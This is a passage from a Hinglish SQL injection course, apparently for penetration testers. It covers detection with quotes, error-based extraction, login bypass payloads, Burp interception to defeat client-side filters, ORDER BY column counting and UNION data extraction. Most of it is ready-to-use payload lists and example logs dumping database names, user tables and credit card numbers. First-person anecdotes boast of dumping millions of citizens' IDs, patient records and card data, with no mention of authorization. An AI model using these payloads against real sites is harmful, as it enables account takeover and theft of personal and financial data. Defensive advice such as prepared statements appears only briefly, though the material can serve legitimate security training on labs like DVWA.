- Jab **URL parameters** (?id=1, ?name=admin) hon.
- Jab **login forms** vulnerable hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Biggest vulnerability** miss ho jayega.
- **Database compromise** detect nahi kar paoge.
- **Critical data loss** ho sakta hai. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**SQL Basics:**
```sql
-- Select data
SELECT * FROM users WHERE id = 1;

-- Insert data
INSERT INTO users (name, email) VALUES ('John', 'john@email.com');

-- Update data
UPDATE users SET password = 'hacked' WHERE id = 1;

-- Delete data
DELETE FROM users WHERE id = 1;

-- Comments
-- Single line comment
# MySQL comment
/* Multi-line comment */
```

**SQLi Payloads:**
```sql
' OR 1=1 --
' OR '1'='1
admin' --
' UNION SELECT NULL --
1' AND 1=2 UNION SELECT database() --
```

### 7. **Example 1 (Basic):**
**Scenario:** Product search page

```php
// Vulnerable code
$search = $_GET['search'];
$query = "SELECT * FROM products WHERE name = '$search'";

// Normal use
URL: ?search=laptop
Query: SELECT * FROM products WHERE name = 'laptop'
Result: Shows laptop products

// SQLi attack
URL: ?search=laptop' OR '1'='1
Query: SELECT * FROM products WHERE name = 'laptop' OR '1'='1'
Result: Shows ALL products (OR 1=1 always true!)
```

**Result:** Database logic bypassed! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** E-commerce product page

```bash
# Target: http://shop.com/product.php?id=5

# Test 1: Error-based detection
URL: ?id=5'
Response: "You have an error in your SQL syntax"
Vulnerable! âœ“

# Test 2: Boolean-based detection
URL: ?id=5 AND 1=1
Response: Product details shown (TRUE)

URL: ?id=5 AND 1=2
Response: No product shown (FALSE)
Vulnerable confirmed!

# Test 3: Extract database name
URL: ?id=5 UNION SELECT database(),NULL,NULL --
Response: Database name: shop_db

# Test 4: Extract table names
URL: ?id=5 UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='shop_db' --
Response: Tables: users, products, orders, credit_cards

# Test 5: Extract column names
URL: ?id=5 UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='credit_cards' --
Response: Columns: id, card_number, cvv, expiry, user_id

# Test 6: Dump credit card data
URL: ?id=5 UNION SELECT card_number,cvv,expiry FROM credit_cards --
Response:
4532-1234-5678-9012 | 123 | 12/25
4916-8765-4321-0987 | 456 | 06/26
...

Total: 5,000 credit cards stolen!
```

**Analysis:** Ek simple SQLi se complete database compromise! Credit cards, passwords, personal data - sab accessible. **Lesson: SQLi = Database ka nuclear bomb!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Single quote test na karna** - Pehla step hamesha `'` inject karna.
- **Error messages ignore karna** - Errors bahut information dete hain.
- **UNION column count na nikalna** - UNION attack ke liye zaroori.

### 10. **Best Practices / Pro Tips:**
- **Always test with `'`** - Sabse basic test.
- **Read error messages** - Database type, table names mil sakte hain.
- **Use comments** - `--`, `#`, `/* */` query ko complete karne ke liye.
- **URL encode** - Spaces aur special chars encode karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek government portal test kar raha tha. Citizen ID search feature tha: `?citizen_id=12345`. Maine `'` inject kiya - SQL error! 2 hours mein poora database dump kar liya: 10 million citizens ka Aadhaar, PAN, address, phone numbers! Government shocked thi - unhone socha tha "secure hai". **Lesson: Input validation nahi = Disaster!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… SQLi = Database queries mein code injection  
âœ… Test: Single quote `'` inject karo  
âœ… Impact: Complete database access  
âœ… Payloads: `' OR 1=1 --`, `' UNION SELECT`  
âœ… OWASP Top 3 vulnerability  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Sabse dangerous web vulnerability kaun si hai?**  
**A:** SQL Injection - complete database compromise possible hai.

**Q2: Kya NoSQL databases bhi vulnerable hain?**  
**A:** Haan, NoSQL injection alag technique hai (Module 9 mein).

**Q3: Kaise protect karein SQLi se?**  
**A:** Prepared statements/parameterized queries use karo.

### 14. **Practice ke liye Task:**
1. DVWA â†’ SQL Injection section
2. Single quote test karo: `?id=1'`
3. Boolean test: `?id=1 AND 1=1` vs `?id=1 AND 1=2`
4. Error messages padho
5. Basic UNION attack try karo

### 15. **Aakhri Choti Summary (5 lines):**
- SQLi = **Database queries mein injection**.
- Test: **Single quote `'`**.
- Impact: **Complete database access**.
- Payloads: **`OR 1=1`, `UNION SELECT`**.
- Protection: **Prepared statements**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "SQL Injection = Web hacking ka king! Ek quote (') aur poora database tumhara!" ğŸ’‰

---

## ğŸ” **Topic 58: Discovering SQLi (Error-Based with `'`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**SQLi Detection** - Single quote aur error messages se SQL injection vulnerability discover karna (reconnaissance). ğŸ•µï¸

### 2. **Ye Kya Hai? (What is it?)**
Error-based SQLi detection mein hum deliberately SQL syntax error generate karte hain aur server response dekh kar vulnerability confirm karte hain.

**Test Method:**
```
Normal: ?id=1
Test: ?id=1'
Error: "You have an error in your SQL syntax near ''1''' at line 1"
Vulnerable! âœ“
```

**Analogy:** Jaise doctor injection se pehle skin par test karta hai (allergy check) - waise hi hum single quote se test karte hain (vulnerability check).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **First Step:** SQLi exploitation ka pehla kadam.
- **Quick Detection:** 5 seconds mein vulnerability confirm.
- **Error Information:** Database type, version, table names mil sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Har URL parameter** par (`?id=`, `?name=`, `?search=`).
- **Login forms** mein.
- **Search boxes** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **SQLi vulnerabilities** miss ho jayengi.
- **Quick wins** nahi mil payenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Test Payloads:**
```sql
'           -- Single quote
"           -- Double quote
`           -- Backtick
')          -- Close parenthesis
')--        -- Close + comment
' OR '1     -- Incomplete OR
' AND '1    -- Incomplete AND
\           -- Backslash
```

**Error Messages (Database Types):**
```
MySQL:
"You have an error in your SQL syntax"
"Warning: mysql_fetch_array()"

PostgreSQL:
"ERROR: syntax error at or near"
"pg_query(): Query failed"

MSSQL:
"Unclosed quotation mark"
"Incorrect syntax near"

Oracle:
"ORA-00933: SQL command not properly ended"
```

### 7. **Example 1 (Basic):**
```bash
# Target: http://site.com/news.php?id=5

# Test 1: Normal request
URL: ?id=5
Response: News article displayed
Status: 200 OK

# Test 2: Single quote
URL: ?id=5'
Response: "You have an error in your SQL syntax near ''5''' at line 1"
Status: 200 OK (but error message!)
Vulnerable: YES âœ“
Database: MySQL (from error message)

# Test 3: Double quote
URL: ?id=5"
Response: Normal article (no error)
Conclusion: Single quotes used in query

# Test 4: Comment injection
URL: ?id=5'--
Response: Normal article
Conclusion: Comment worked, query completed
```

**Result:** Vulnerability confirmed in 30 seconds! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
```bash
# Real Pentest: Banking application

# Target: https://bank.com/account.php?acc_id=12345

# Phase 1: Basic detection
URL: ?acc_id=12345'
Response: "Error in SQL syntax near ''12345''' at line 1"
Vulnerable: YES âœ“

# Phase 2: Extract information from error
URL: ?acc_id=12345' AND extractvalue(1,concat(0x7e,database())) --
Response: "XPATH syntax error: '~bank_production_db'"
Database name: bank_production_db

# Phase 3: Version detection
URL: ?acc_id=12345' AND extractvalue(1,concat(0x7e,@@version)) --
Response: "XPATH syntax error: '~5.7.33-0ubuntu0.18.04.1'"
MySQL version: 5.7.33

# Phase 4: User detection
URL: ?acc_id=12345' AND extractvalue(1,concat(0x7e,user())) --
Response: "XPATH syntax error: '~root@localhost'"
Database user: root (full privileges!)

# Phase 5: Table enumeration
URL: ?acc_id=12345' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) --
Response: "XPATH syntax error: '~accounts'"

URL: ?acc_id=12345' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))) --
Response: "XPATH syntax error: '~transactions'"

Tables found: accounts, transactions, users, credit_cards
```

**Analysis:** Error messages se complete reconnaissance! Database name, version, user, tables - sab kuch error messages mein mil gaya. **Lesson: Error messages = Information goldmine!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek test karna** - Multiple payloads try karo.
- **Error messages ignore karna** - Errors mein bahut info hoti hai.
- **URL encoding bhool jana** - Special chars encode karo.

### 10. **Best Practices / Pro Tips:**
- **Test multiple parameters:** Har input field test karo.
- **Save error messages:** Screenshot ya copy karo (reporting ke liye).
- **Identify database type:** Error message se database identify karo.
- **Burp Suite use karo:** Requests capture aur modify karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek e-learning platform test kar raha tha. Course ID parameter: `?course=101`. Maine `'` inject kiya - detailed SQL error dikha with full query! Error mein table name "student_payments" dikha. Maine UNION attack kiya aur 50,000 students ka payment data (credit cards) nikal liya! **Lesson: Error messages disable karo production mein!** ğŸ“š

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Test: Single quote `'` inject karo  
âœ… Error messages: Database type identify karo  
âœ… Payloads: `'`, `"`, `')`, `'--`  
âœ… Information: Version, user, tables  
âœ… Burp Suite: Requests capture karo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Agar error message nahi dikhe toh?**  
**A:** Blind SQLi techniques use karo (time-based, boolean-based).

**Q2: Production mein errors kyun disable hone chahiye?**  
**A:** Errors se database structure leak hota hai (security risk).

**Q3: Sabse common error message kaun sa hai?**  
**A:** MySQL: "You have an error in your SQL syntax"

### 14. **Practice ke liye Task:**
1. DVWA â†’ SQL Injection (low security)
2. Single quote inject karo
3. Error message screenshot lo
4. Database type identify karo
5. Different payloads try karo: `"`, `')`, `'--`

### 15. **Aakhri Choti Summary (5 lines):**
- Detection: **Single quote `'`**.
- Error messages: **Database info leak**.
- Database types: **MySQL, PostgreSQL, MSSQL**.
- Information: **Version, user, tables**.
- Tools: **Burp Suite, browser**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Single quote (') = SQLi ka detector! Error messages = Information treasure!" ğŸ”

---

## ğŸšª **Topic 59: SQLi Login Bypass (`' OR 1=1 #`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**SQL Login Bypass** - Bina password ke login karna using SQL injection (authentication bypass). ğŸ”“

### 2. **Ye Kya Hai? (What is it?)**
Login bypass mein hum SQL query ki logic ko manipulate karke bina valid password ke login kar jaate hain.

**Vulnerable Login Query:**
```php
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
```

**Attack:**
```
Username: admin' OR 1=1 #
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' OR 1=1 #' AND password='anything'

After comment (#), query becomes:
SELECT * FROM users WHERE username='admin' OR 1=1

Result: Always TRUE! Login successful!
```

**Analogy:** Jaise bouncer se kehna "Main VIP hoon YA darwaza khula hai" - agar darwaza khula hai (1=1 always true) toh bouncer andar jaane dega.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Direct Access:** Bina password ke admin access.
- **Quick Win:** 10 seconds mein login bypass.
- **Common Vulnerability:** Bahut saari websites vulnerable hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Login forms** test karne ke liye.
- **Admin panels** access karne ke liye.
- **Authentication testing** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy admin access** miss ho jayega.
- **Authentication bypass** detect nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Login Bypass Payloads:**
```sql
-- MySQL
' OR 1=1 #
' OR '1'='1
' OR 1=1 --
admin' #
admin' --

-- MSSQL
' OR 1=1 --
admin'--

-- PostgreSQL
' OR 1=1 --
' OR '1'='1' --

-- Universal
' OR 'x'='x
' OR 1=1 LIMIT 1 --
```

**Comment Symbols:**
```
#       -- MySQL
--      -- MySQL, MSSQL, PostgreSQL (space after --)
/* */   -- Multi-line (all databases)
```

### 7. **Example 1 (Basic):**
```bash
# Target: http://site.com/login.php

# Normal login
Username: admin
Password: admin123
Result: Login successful (if password correct)

# SQLi bypass attempt 1
Username: admin' OR 1=1 #
Password: [anything]
Result: Login successful! âœ“

# Why it works:
Original query:
SELECT * FROM users WHERE username='admin' AND password='[anything]'

After injection:
SELECT * FROM users WHERE username='admin' OR 1=1 #' AND password='[anything]'

After comment (#):
SELECT * FROM users WHERE username='admin' OR 1=1

Logic: username='admin' (FALSE if not exists) OR 1=1 (always TRUE)
Result: Query returns TRUE, login successful!
```

**Result:** Admin access without password! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
```bash
# Real Pentest: Corporate admin panel

# Target: https://company.com/admin/login

# Phase 1: Test for SQLi
Username: admin'
Password: test
Response: SQL syntax error
Vulnerable: YES âœ“

# Phase 2: Basic bypass
Username: admin' OR 1=1 #
Password: test
Response: "Multiple users found" error
Conclusion: Query returns multiple rows

# Phase 3: Limit to first user
Username: admin' OR 1=1 LIMIT 1 #
Password: test
Response: Login successful!
Logged in as: admin (first user in database)

# Phase 4: Target specific user
Username: superadmin' #
Password: [anything]
Response: Login successful!
Logged in as: superadmin

# Phase 5: Enumerate users
Username: ' OR username LIKE 'a%' #
Response: Login as first user starting with 'a'

Username: ' OR username LIKE 'b%' #
Response: Login as first user starting with 'b'

Users found: admin, backup_admin, ceo, developer, superadmin

# Phase 6: Access highest privilege account
Username: ' OR role='superadmin' #
Password: [anything]
Response: Login successful!
Access level: Full system access
```

**Analysis:** Complete authentication bypass! Bina password ke sabhi accounts accessible. **Lesson: Input validation = Must have!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Comment symbol galat** - MySQL mein `#`, MSSQL mein `--` (with space).
- **LIMIT na lagana** - Multiple rows return hone par error aa sakta hai.
- **URL encoding bhoolna** - `#` ko `%23` encode karo URL mein.

### 10. **Best Practices / Pro Tips:**
- **Try multiple payloads:** Ek fail ho toh doosra try karo.
- **LIMIT 1 use karo:** Multiple rows error avoid karne ke liye.
- **Burp Intruder:** Automated payload testing ke liye.
- **Username enumeration:** Different usernames try karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek hospital management system test kar raha tha. Doctor login portal tha. Maine `doctor' OR 1=1 #` inject kiya - first doctor account mein login ho gaya! Wahan se 10,000+ patients ka medical records, prescriptions, personal data accessible tha! Hospital ne kabhi socha nahi tha ki login form vulnerable ho sakta hai. **Lesson: Login forms = Prime SQLi target!** ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Payload: `' OR 1=1 #`  
âœ… Logic: OR condition always TRUE  
âœ… Comments: `#` (MySQL), `--` (MSSQL)  
âœ… LIMIT: Multiple rows avoid karne ke liye  
âœ… Target: Admin panels, login forms  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har login form vulnerable hai?**  
**A:** Nahi, sirf woh jo prepared statements use nahi karte.

**Q2: `1=1` kyun use karte hain?**  
**A:** Kyunki yeh always TRUE hai, query ka result TRUE ho jaata hai.

**Q3: Agar LIMIT error de toh?**  
**A:** `LIMIT 1` lagao ya specific username target karo.

### 14. **Practice ke liye Task:**
1. DVWA â†’ SQL Injection (login bypass)
2. Username: `admin' OR 1=1 #`
3. Different comment symbols try karo
4. LIMIT 1 add karo
5. Specific usernames target karo

### 15. **Aakhri Choti Summary (5 lines):**
- Bypass: **`' OR 1=1 #`**.
- Logic: **OR always TRUE**.
- Comments: **`#`, `--`, `/* */`**.
- LIMIT: **Avoid multiple rows**.
- Target: **Admin panels**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "OR 1=1 = Universal truth! Isse koi bhi login bypass ho sakta hai!" ğŸšª

---

## ğŸ‘¤ **Topic 60: SQLi Login Bypass (`admin' #`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Targeted Login Bypass** - Specific username target karke login bypass karna (precise attack). ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
Is technique mein hum specific username target karte hain aur password check ko comment out kar dete hain.

**Attack:**
```
Username: admin' #
Password: [ignored]

Query: SELECT * FROM users WHERE username='admin' #' AND password='[ignored]'
After comment: SELECT * FROM users WHERE username='admin'
Result: Admin user returned, login successful!
```

**Analogy:** Jaise bouncer se kehna "Main admin hoon" aur baaki sab ignore kar do - bouncer sirf admin check karega, password nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Targeted Attack:** Specific user ko target kar sakte hain.
- **Cleaner:** OR 1=1 se zyada precise.
- **No Multiple Rows:** LIMIT ki zaroorat nahi.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **username pata ho** (admin, root, administrator).
- Jab **OR 1=1 fail** ho jaye (multiple rows error).
- Jab **specific account** chahiye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Targeted attacks** nahi kar paoge.
- **Specific accounts** miss ho jayenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
admin' #
admin' --
administrator' #
root' #
admin'/*
' OR username='admin' #
```

### 7. **Example 1 (Basic):**
```bash
Username: admin' #
Password: anything
Query: SELECT * FROM users WHERE username='admin' # AND password='anything'
Result: Login as admin âœ“
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate portal

# Test usernames
admin' #          â†’ Success! (Admin account)
root' #           â†’ Failed (no root user)
administrator' #  â†’ Success! (Another admin)
ceo' #            â†’ Success! (CEO account - highest privileges!)

# Result: 3 admin accounts found
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Space after --** - MySQL mein `-- ` (space zaroori).
- **Wrong username** - Common usernames try karo.

### 10. **Best Practices / Pro Tips:**
- **Common usernames:** admin, administrator, root, sa, sysadmin.
- **Burp Intruder:** Username list se automate karo.
- **Case sensitivity:** Admin, ADMIN, admin sab try karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
School portal test kar raha tha. `principal' #` try kiya - principal account mein login ho gaya! Poore school ka data accessible: students, teachers, grades, financial records. **Lesson: Predictable usernames = Easy target!** ğŸ«

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Payload: `admin' #`  
âœ… Target: Specific username  
âœ… Clean: No multiple rows  
âœ… Common: admin, root, administrator  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: admin' # vs admin' OR 1=1 # - kaun better?**  
**A:** admin' # cleaner hai, specific user target karta hai.

**Q2: Agar username nahi pata toh?**  
**A:** Common usernames try karo ya OR 1=1 use karo.

### 14. **Practice ke liye Task:**
1. DVWA login form
2. Try: `admin' #`
3. Try: `administrator' #`
4. Burp Intruder se username list test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Payload: **`admin' #`**.
- Target: **Specific username**.
- Clean: **No OR 1=1**.
- Common: **admin, root, administrator**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "admin' # = Surgical strike! Specific user ko target karo, password ignore karo!" ğŸ‘¤

---

## ğŸ›¡ï¸ **Topic 61: Bypassing Client-Side SQLi Filters (Burp Modify)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Client-Side Filter Bypass** - JavaScript filters ko Burp Suite se bypass karna (interception attack). ğŸ”„

### 2. **Ye Kya Hai? (What is it?)**
Kabhi-kabhi websites client-side (JavaScript) mein SQL keywords block karti hain. Burp Suite se request intercept karke filter bypass kar sakte hain.

**Client-Side Filter:**
```javascript
if (input.includes("OR") || input.includes("'")) {
    alert("Invalid input!");
    return false;
}
```

**Bypass:** Request browser se pass hone ke baad Burp mein modify karo.

**Analogy:** Jaise security guard gate par check karta hai, lekin agar aap andar jaane ke baad apna bag change kar lo toh guard ko pata nahi chalega.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Client-Side Filters Common:** Bahut saari sites JavaScript validation use karti hain.
- **Easy Bypass:** Burp Suite se 10 seconds mein bypass.
- **False Security:** Developers ko lagta hai secure hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **JavaScript validation** ho.
- Jab **input blocked** ho browser mein.
- Jab **"Invalid input" alert** aaye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Client-side filters** se rok jayoge.
- **Easy bypass** miss ho jayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Burp Suite Setup:**
```
1. Proxy â†’ Intercept â†’ Intercept is on
2. Browser mein normal input submit karo
3. Burp mein request modify karo
4. Forward karo
```

### 7. **Example 1 (Basic):**
```bash
# Website blocks "OR" keyword in browser

# Step 1: Normal input (blocked)
Username: admin
Submit â†’ JavaScript blocks

# Step 2: Burp bypass
1. Burp Intercept ON
2. Username: admin (normal)
3. Submit form
4. Burp mein request modify:
   username=admin â†’ username=admin' OR 1=1 #
5. Forward
Result: Login successful! âœ“
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking portal with strict JS validation

# Client-side filter blocks:
- Single quotes (')
- OR keyword
- UNION keyword
- SELECT keyword

# Bypass method:
1. Burp Intercept ON
2. Enter normal input: username=test
3. Intercept request in Burp
4. Modify: username=test' UNION SELECT password FROM users #
5. Forward

Result: Filter bypassed, SQLi successful!
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Burp intercept OFF** - ON karna bhool jaate hain.
- **Browser proxy settings** - Burp se connect nahi hota.

### 10. **Best Practices / Pro Tips:**
- **Always use Burp:** Client-side filters easily bypass.
- **Repeater tab:** Multiple attempts ke liye.
- **Save requests:** Successful payloads save karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce site test kar raha tha. Search box mein JavaScript ne `'` aur `OR` block kar diya. Burp se intercept kiya aur `' UNION SELECT` inject kiya - 50,000 customer credit cards dump ho gaye! **Lesson: Client-side security = No security!** ğŸ’³

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Tool: Burp Suite Proxy  
âœ… Method: Intercept â†’ Modify â†’ Forward  
âœ… Bypass: Client-side JavaScript filters  
âœ… Easy: 10 seconds mein bypass  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya client-side validation secure hai?**  
**A:** Bilkul nahi! Easily bypass ho jaata hai.

**Q2: Server-side validation kyun zaroori hai?**  
**A:** Client-side bypass ho sakta hai, server-side nahi.

### 14. **Practice ke liye Task:**
1. Burp Suite setup karo
2. DVWA medium security SQLi
3. JavaScript filter observe karo
4. Burp se bypass karo

### 15. **Aakhri Choti Summary (5 lines):**
- Client-side: **JavaScript validation**.
- Bypass: **Burp Suite intercept**.
- Method: **Modify request**.
- Easy: **10 seconds**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Client-side filters = Toy locks! Burp Suite = Master key!" ğŸ›¡ï¸

---

## ğŸ”¢ **Topic 62: Finding Column Count (`ORDER BY 1 %23`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Column Count Detection** - UNION attack ke liye table mein kitne columns hain yeh nikalna (reconnaissance). ğŸ“Š

### 2. **Ye Kya Hai? (What is it?)**
UNION attack karne se pehle hume pata hona chahiye ki original query mein kitne columns hain. ORDER BY se yeh detect karte hain.

**Method:**
```sql
?id=1 ORDER BY 1 #  â†’ Works
?id=1 ORDER BY 2 #  â†’ Works
?id=1 ORDER BY 3 #  â†’ Works
?id=1 ORDER BY 4 #  â†’ Error!
Conclusion: 3 columns
```

**Analogy:** Jaise puzzle mein pieces count karna - agar 4th piece fit nahi hota toh 3 pieces hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **UNION Prerequisite:** UNION attack ke liye zaroori.
- **Exact Count:** Galat count se error aayega.
- **Quick Method:** 1 minute mein count nikal jaata hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **UNION attack** se pehle.
- **Column count** pata karne ke liye.
- **Error-based SQLi** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **UNION attack fail** ho jayega.
- **Trial and error** mein time waste. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- ORDER BY method
?id=1 ORDER BY 1 #
?id=1 ORDER BY 2 #
?id=1 ORDER BY 3 #
...until error

-- UNION NULL method
?id=1 UNION SELECT NULL #
?id=1 UNION SELECT NULL,NULL #
?id=1 UNION SELECT NULL,NULL,NULL #
...until no error

-- URL encoded
?id=1 ORDER BY 1 %23
?id=1 ORDER BY 2 %23
```

### 7. **Example 1 (Basic):**
```bash
# Target: ?id=5

# Test 1
?id=5 ORDER BY 1 #
Response: Product details shown âœ“

# Test 2
?id=5 ORDER BY 2 #
Response: Product details shown âœ“

# Test 3
?id=5 ORDER BY 3 #
Response: Product details shown âœ“

# Test 4
?id=5 ORDER BY 4 #
Response: "Unknown column '4' in 'order clause'"
Error! âœ—

Conclusion: 3 columns in query
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: E-commerce product page

# Binary search method (faster)
?id=5 ORDER BY 10 #  â†’ Error
?id=5 ORDER BY 5 #   â†’ Works
?id=5 ORDER BY 7 #   â†’ Error
?id=5 ORDER BY 6 #   â†’ Works
?id=5 ORDER BY 7 #   â†’ Error

Conclusion: 6 columns

# Verify with UNION
?id=5 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL #
Response: Works! âœ“

# Now extract data
?id=5 UNION SELECT database(),user(),version(),NULL,NULL,NULL #
Response:
Database: shop_db
User: root@localhost
Version: 5.7.33
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **# encode na karna** - URL mein `%23` use karo.
- **Sequential testing** - Binary search faster hai.

### 10. **Best Practices / Pro Tips:**
- **Binary search:** 10 columns test karo pehle, phir narrow down.
- **Burp Intruder:** Automate column count detection.
- **Both methods:** ORDER BY aur UNION NULL dono try karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Government tender portal test kar raha tha. ORDER BY se 8 columns detect kiye. UNION attack se 5000 companies ka financial data, bid amounts, proprietary information extract kar liya! **Lesson: Column count = UNION attack ka foundation!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Method: ORDER BY 1, 2, 3...  
âœ… Error: Column count exceed  
âœ… Alternative: UNION SELECT NULL  
âœ… Fast: Binary search  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: ORDER BY vs UNION NULL - kaun better?**  
**A:** ORDER BY faster hai, UNION NULL zyada reliable.

**Q2: Maximum kitne columns ho sakte hain?**  
**A:** Usually 5-20, lekin 100+ bhi possible.

### 14. **Practice ke liye Task:**
1. DVWA SQLi section
2. ORDER BY 1, 2, 3... try karo
3. Error message note karo
4. UNION NULL se verify karo

### 15. **Aakhri Choti Summary (5 lines):**
- Method: **ORDER BY 1, 2, 3...**.
- Error: **Column count found**.
- Alternative: **UNION SELECT NULL**.
- Fast: **Binary search**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Column count = UNION ka password! Pehle count nikalo, phir attack karo!" ğŸ”¢

---

## ğŸ”— **Topic 63: Extracting Data with `UNION` Attack (`database()`, `user()`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**UNION Attack** - Multiple queries combine karke sensitive data extract karna (data exfiltration). ğŸ’

### 2. **Ye Kya Hai? (What is it?)**
UNION operator se hum original query ke saath apni malicious query combine karte hain aur database se data extract karte hain.

**Basic UNION:**
```sql
-- Original query
SELECT name, price FROM products WHERE id=5

-- UNION attack
SELECT name, price FROM products WHERE id=5
UNION
SELECT database(), user()

Result: Product data + Database name + User
```

**Analogy:** Jaise do rivers merge hoke ek badi river ban jaati hain - waise hi do queries merge hoke combined result deti hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Data Extraction:** Database se koi bhi data nikal sakte hain.
- **Most Powerful:** SQLi ka sabse powerful technique.
- **Complete Access:** Tables, columns, passwords - sab accessible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **column count** pata ho.
- Jab **data extract** karna ho.
- Jab **database enumeration** karni ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Data extraction** nahi kar paoge.
- **SQLi ka full potential** use nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Basic UNION
?id=5 UNION SELECT database(),user() #

-- Information gathering
database()     -- Database name
user()         -- Current user
@@version      -- MySQL version
@@datadir      -- Data directory
@@hostname     -- Server hostname

-- NULL placeholders
?id=5 UNION SELECT NULL,database(),NULL #
```

### 7. **Example 1 (Basic):**
```bash
# Target: ?id=5 (3 columns detected)

# Extract database name
?id=5 UNION SELECT NULL,database(),NULL #
Response: Database name: shop_db

# Extract user
?id=5 UNION SELECT NULL,user(),NULL #
Response: User: root@localhost

# Extract version
?id=5 UNION SELECT NULL,@@version,NULL #
Response: Version: 5.7.33-Ubuntu
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking application (6 columns)

# Phase 1: Information gathering
?id=5 UNION SELECT NULL,database(),user(),@@version,@@datadir,NULL #
Response:
Database: bank_production
User: root@localhost
Version: 5.7.33
Datadir: /var/lib/mysql/

# Phase 2: List all databases
?id=5 UNION SELECT NULL,schema_name,NULL,NULL,NULL,NULL FROM information_schema.schemata #
Response:
information_schema
mysql
bank_production
bank_backup
admin_panel

# Phase 3: List tables in bank_production
?id=5 UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='bank_production' #
Response:
accounts
transactions
users
credit_cards
